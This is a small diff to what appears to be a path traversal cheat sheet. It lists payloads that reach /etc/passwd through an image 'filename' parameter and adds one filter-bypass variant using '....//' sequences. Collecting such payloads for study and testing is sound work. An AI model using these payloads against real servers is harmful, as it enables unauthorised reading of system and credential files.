@@ -20,4 +20,6 @@ Allows read files in a server
 /image?filename=/../../../../../../../../etc/passwd
 /image?filename=/../../../../../../../../etc/passwd
 GET /image?filename=/etc/passwd
+....//....//....//etc/passwd
+
 ```
